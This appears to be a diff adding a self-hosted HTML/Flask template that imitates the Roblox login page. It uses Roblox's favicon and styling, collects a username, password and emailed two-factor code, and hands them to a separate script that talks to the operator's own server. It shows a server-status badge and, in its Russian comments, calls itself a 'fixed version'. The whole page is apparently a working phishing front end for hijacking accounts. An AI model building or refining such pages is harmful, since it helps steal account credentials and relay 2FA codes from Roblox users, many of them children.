@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Login - Исправленная версия</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico">
+    <style>
+        body { background: #232527; }
+        .hidden { display: none; }
+        .status-indicator {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            padding: 8px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            z-index: 1000;
+        }
+        .status-online { background: #28a745; color: white; }
+        .status-offline { background: #dc3545; color: white; }
+        .status-checking { background: #ffc107; color: #212529; }
+    </style>
+</head>
+<body class="rbx-body dark-theme builder-font">
+    <!-- Индикатор состояния сервера -->
+    <div id="serverStatus" class="status-indicator status-checking">
+        Проверка сервера...
+    </div>
+
+    <div class="container-main">
+        <div class="login-form-container">
+            <form class="login-form" id="loginForm">
+                <div class="form-group username-form-group">
+                    <label for="login-username" class="sr-only">Username/Email/Phone</label>
+                    <input id="login-username" name="username" type="text" class="form-control input-field" autocomplete="username webauthn" placeholder="Username/Email/Phone" required>
+                </div>
+                <div class="form-group password-form-group">
+                    <label for="login-password" class="sr-only">Password</label>
+                    <input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Password" required>
+                </div>
+                <div class="form-group remember-me-form-group">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember">Remember me</label>
+                </div>
+                <button type="submit" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button>
+            </form>
+            
+            <form class="login-form hidden" id="codeForm">
+                <div class="form-group">
+                    <label for="code-input">Enter the code from your email</label>
+                    <input id="code-input" name="code" type="text" class="form-control input-field" maxlength="6" placeholder="6-digit code" required>
+                </div>
+                <button type="submit" id="code-button" class="btn-full-width login-button btn-secondary-md">Submit Code</button>
+            </form>
+            
+            <div class="text-center forgot-credentials-link">
+                <a id="forgot-credentials-link" class="text-link" href="#">Forgot password or username?</a>
+            </div>
+            <div class="text-center signup-link">
+                <span>Don't have an account?</span> <a href="#" class="text-link">Sign Up</a>
+            </div>
+            <div id="result" class="result-message"></div>
+            
+            <!-- Информация о сервере -->
+            <div style="margin-top: 20px; padding: 15px; background: rgba(255,255,255,0.1); border-radius: 8px; text-align: center;">
+                <small style="color: #ccc;">
+                    <strong>Сервер:</strong> <span id="serverInfo">Определяется...</span><br>
+                    <strong>Статус:</strong> <span id="serverStatusText">Проверяется...</span>
+                </small>
+            </div>
+        </div>
+    </div>
+
+    <!-- Подключаем исправленный JavaScript -->
+    <script src="{{ url_for('static', filename='js/fixed-login.js') }}"></script>
+    
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        var loginForm = document.getElementById('loginForm');
+        var codeForm = document.getElementById('codeForm');
+        var resultDiv = document.getElementById('result');
+        var sessionId = null;
+        var serverInfo = document.getElementById('serverInfo');
+        var serverStatusText = document.getElementById('serverStatusText');
+        var serverStatusIndicator = document.getElementById('serverStatus');
+
+        // Обновляем информацию о сервере
+        function updateServerInfo() {
+            serverInfo.textContent = window.SERVER_URL;
+            serverStatusText.textContent = 'Подключен';
+            serverStatusIndicator.className = 'status-indicator status-online';
+            serverStatusIndicator.textContent = '✅ Сервер работает';
+        }
+
+        // Проверяем состояние сервера
+        async function checkServerStatus() {
+            try {
+                const isHealthy = await window.RobloxLogin.checkServerHealth();
+                if (isHealthy) {
+                    updateServerInfo();
+                } else {
+                    serverStatusText.textContent = 'Недоступен';
+                    serverStatusIndicator.className = 'status-indicator status-offline';
+                    serverStatusIndicator.textContent = '❌ Сервер недоступен';
+                }
+            } catch (error) {
+                serverStatusText.textContent = 'Ошибка подключения';
+                serverStatusIndicator.className = 'status-indicator status-offline';
+                serverStatusIndicator.textContent = '❌ Ошибка';
+            }
+        }
+
+        // Обработчик формы логина
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('login-username').value;
+            const password = document.getElementById('login-password').value;
+            const remember = document.getElementById('remember').checked;
+            
+            // Очищаем предыдущие результаты
+            resultDiv.style.display = 'none';
+            resultDiv.textContent = '';
+            
+            try {
+                // Используем исправленную функцию логина
+                const result = await window.RobloxLogin.handleLogin(username, password, remember);
+                
+                if (result.type === 'need_code') {
+                    sessionId = result.session_id;
+                    loginForm.classList.add('hidden');
+                    codeForm.classList.remove('hidden');
+                    resultDiv.style.display = 'block';
+                    resultDiv.textContent = 'Введите код из почты Roblox.';
+                    resultDiv.className = 'result-message';
+                } else if (result.type === 'success') {
+                    resultDiv.style.display = 'block';
+                    resultDiv.textContent = result.message;
+                    resultDiv.className = 'result-message success';
+                    loginForm.reset();
+                } else {
+                    resultDiv.style.display = 'block';
+                    resultDiv.textContent = result.message;
+                    resultDiv.className = 'result-message error';
+                }
+            } catch (error) {
+                resultDiv.style.display = 'block';
+                resultDiv.textContent = `Ошибка: ${error.message}`;
+                resultDiv.className = 'result-message error';
+            }
+        });
+
+        // Обработчик формы 2FA
+        codeForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const code = document.getElementById('code-input').value;
+            if (!sessionId) {
+                resultDiv.style.display = 'block';
+                resultDiv.textContent = 'Нет session_id. Попробуйте войти заново.';
+                resultDiv.className = 'result-message error';
+                return;
+            }
+            
+            try {
+                // Используем исправленную функцию 2FA
+                const result = await window.RobloxLogin.handleCodeSubmit(sessionId, code);
+                
+                if (result.type === 'success') {
+                    resultDiv.style.display = 'block';
+                    resultDiv.textContent = result.message;
+                    resultDiv.className = 'result-message success';
+                    codeForm.reset();
+                    codeForm.classList.add('hidden');
+                    loginForm.classList.remove('hidden');
+                } else {
+                    resultDiv.style.display = 'block';
+                    resultDiv.textContent = result.message;
+                    resultDiv.className = 'result-message error';
+                }
+            } catch (error) {
+                resultDiv.style.display = 'block';
+                resultDiv.textContent = `Ошибка: ${error.message}`;
+                resultDiv.className = 'result-message error';
+            }
+        });
+
+        // Проверяем состояние сервера при загрузке
+        setTimeout(checkServerStatus, 1000);
+        
+        // Периодически проверяем состояние сервера
+        setInterval(checkServerStatus, 30000);
+    });
+    </script>
+</body>
+</html> 
